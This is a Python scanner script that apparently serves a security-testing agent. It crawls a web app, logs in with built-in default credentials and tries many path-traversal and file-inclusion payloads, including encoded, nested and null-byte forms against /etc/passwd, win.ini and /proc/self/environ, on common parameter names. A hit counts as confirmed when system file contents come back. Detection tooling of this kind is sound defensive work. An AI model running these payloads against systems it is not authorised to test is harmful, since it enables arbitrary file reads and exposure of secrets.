#!/usr/bin/env python3
r"""pathtraversal_harness.py - Path Traversal / Local File Inclusion detector (black-box, anon).

Confirm oracle (DETERMINISTIC, zero-FP): we ask a file-ish parameter to read a well-known OS file
that the app should never return, and CONFIRM only when the response contains that file's unmistakable
content SIGNATURE:
  * *nix /etc/passwd  -> a line matching  root:x:0:0:
  * Windows win.ini   -> the  [extensions]/[fonts]  section or  "for 16-bit app support"
A param that reflects the payload, 404s, or returns an app page is NOT a finding - only the actual
file contents are. Signatures are specific enough that an accidental match is effectively impossible.

Payload battery covers depth 1..8 with plain, nested (....//), URL-encoded, double-encoded, absolute,
and null-byte-suffixed traversal, for both POSIX and Windows. Read-only GET. Self-contained:
reads NABLUS_TARGET / NABLUS_SEEDS, writes pathtraversal_findings.json. `--selftest` = no network.
"""
from __future__ import annotations  # noqa
import os, re, sys, json, time, http.cookiejar, urllib.request, urllib.parse, urllib.error, pathlib
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl
from html.parser import HTMLParser

BASE = os.environ.get("NABLUS_TARGET", "http://127.0.0.1:8099").rstrip("/")
OUT = r"C:\Users\Laith\nabulus-agent\pathtraversal_findings.json"
SEEDS = [s.strip() for s in os.environ.get("NABLUS_SEEDS", "").split(",") if s.strip()]
PACE = 0.02

LFI_PARAMS = ["file", "path", "page", "filename", "filepath", "name", "doc", "document", "download",
              "dir", "folder", "template", "view", "include", "inc", "load", "read", "src", "img",
              "image", "attachment", "pdf", "report", "log", "lang", "locale", "style", "css",
              "cat", "action", "board", "detail", "conf", "config", "item", "resource"]

# signature -> (regex, label)
_PASSWD = re.compile(r"root:.?:0:0:", re.M)              # root:x:0:0:  (x or ! or blank)
_WININI = re.compile(r"\[(?:extensions|fonts|mci extensions)\]|for 16-bit app support", re.I)


def _build_payloads():
    """Traversal payloads that should resolve to /etc/passwd or windows\\win.ini."""
    posix_tail, win_tail = "etc/passwd", "windows/win.ini"
    pl = []
    for depth in range(3, 9):
        up = "../" * depth
        upn = "....//" * depth                                   # strip-once filter bypass
        upe = "%2e%2e%2f" * depth                                # url-encoded
        upd = "%252e%252e%252f" * depth                          # double-encoded
        pl += [up + posix_tail, upn + posix_tail, upe + posix_tail + "", upd + posix_tail]
        pl += [up + posix_tail + "%00", up + posix_tail + "\x00.png"]   # null-byte truncation
        wup = "..\\" * depth
        pl += [wup + "windows\\win.ini", up + win_tail, ("..%5c" * depth) + "windows%5cwin.ini"]
    pl += ["/etc/passwd", "file:///etc/passwd", "C:\\windows\\win.ini", "/proc/self/environ"]
    # de-dup, keep order
    seen, out = set(), []
    for p in pl:
        if p not in seen:
            seen.add(p); out.append(p)
    return out


PAYLOADS = _build_payloads()


def evaluate(body):
    """Pure oracle. Return a signature label if the response IS a leaked system file, else None."""
    if not body:
        return None
    if _PASSWD.search(body):
        return "etc/passwd (root:x:0:0: line)"
    if _WININI.search(body):
        return "windows/win.ini (section header)"
    return None


class _Links(HTMLParser):
    def __init__(self):
        super().__init__(); self.hrefs = []
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if a.get("href"):
            self.hrefs.append(a["href"])


def login_cookie():
    cj = http.cookiejar.CookieJar()
    try:
        op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        op.open(BASE + "/login", data=urlencode(
            {"username": os.environ.get("NABLUS_USER", "alice"),
             "password": os.environ.get("NABLUS_PASS", "Sunflower#A1pha")}).encode(), timeout=8)
    except Exception:
        pass
    return "; ".join(f"{c.name}={c.value}" for c in cj)


def fetch(url, cookie):
    if PACE:
        time.sleep(PACE)
    try:
        req = urllib.request.Request(url, headers={"Cookie": cookie} if cookie else {})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, (e.read(200000).decode("utf-8", "replace") if e.fp else "")
    except Exception:
        return 0, ""


def candidates(cookie):
    seen, frontier, cands, stems = set(), [BASE + "/"], set(), set()
    for _ in range(2):
        nxt = []
        for u in frontier:
            if u in seen or len(seen) >= 15:
                continue
            seen.add(u)
            st, body = fetch(u, cookie)
            if st not in (200, 301, 302, 303, 307, 308):
                continue
            pr = urlparse(u)
            stems.add(f"{pr.scheme}://{pr.netloc}{pr.path}")
            for k, _v in parse_qsl(pr.query):
                cands.add((f"{pr.scheme}://{pr.netloc}{pr.path}", k))
            p = _Links()
            try:
                p.feed(body)
            except Exception:
                pass
            for h in p.hrefs:
                link = urljoin(u, h).split("#")[0]
                if link.startswith(BASE) and link not in seen and "logout" not in link.lower():
                    nxt.append(link)
        frontier = nxt
    for s in SEEDS:
        pr = urlparse(s if "://" in s else BASE + ("" if s.startswith("/") else "/") + s)
        stems.add(f"{pr.scheme}://{pr.netloc}{pr.path}")
        for k, _v in parse_qsl(pr.query):
            cands.add((f"{pr.scheme}://{pr.netloc}{pr.path}", k))
    for stem in stems | {BASE + "/"}:
        for pn in LFI_PARAMS:
            cands.add((stem, pn))
    return sorted(cands)


def confirm(base, param, cookie):
    for pl in PAYLOADS:
        u = f"{base}?{urlencode({param: pl})}"
        _st, body = fetch(u, cookie)
        sig = evaluate(body)
        if sig:
            return {"payload": pl, "signature": sig}
    return None


def main():
    cookie = login_cookie()
    cands = candidates(cookie)
    findings, tested = [], set()
    print(f"target: {BASE} | candidates: {len(cands)} | payloads/param: {len(PAYLOADS)}")
    for base, param in cands:
        key = base + "|" + param
        if key in tested:
            continue
        tested.add(key)
        proof = confirm(base, param, cookie)
        if proof:
            findings.append({"class": "path-traversal", "severity": "high", "endpoint": base,
                             "param": param, "proof": proof,
                             "proof_request": f"GET {base}?{param}={proof['payload']}",
                             "validated_by": f"server returned {proof['signature']} - arbitrary file read",
                             "confirmed": True})
            print(f"[lfi] CONFIRMED: {urlparse(base).path}?{param}=  -> {proof['signature']}")
    pathlib.Path(OUT).write_text(json.dumps(findings, indent=2), encoding="utf-8")
    print(f"[lfi] confirmed path-traversal findings: {len(findings)} -> {OUT}")
    return 0


def selftest():
    ok = True
    cases = [
        ("passwd",   "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:", "etc/passwd (root:x:0:0: line)"),
        ("passwd-!", "root:!:0:0:root:/root:/bin/sh\n",                "etc/passwd (root:x:0:0: line)"),
        ("winini",   "; for 16-bit app support\n[fonts]\n[extensions]\n", "windows/win.ini (section header)"),
        ("app-page", "<html><head><title>Login</title></head><body>hi</body></html>", None),
        ("reflect",  "Error: file ../../../../etc/passwd not found", None),  # path echoed, no contents
        ("empty",    "", None),
    ]
    for name, body, want in cases:
        got = evaluate(body)
        flag = "OK" if got == want else "FAIL"
        if got != want:
            ok = False
        print(f"  [{flag}] {name}: sig={got!r} want={want!r}")
    print(f"  (payload battery: {len(PAYLOADS)} variants)")
    print("SELFTEST", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        raise SystemExit(selftest())
    raise SystemExit(main())
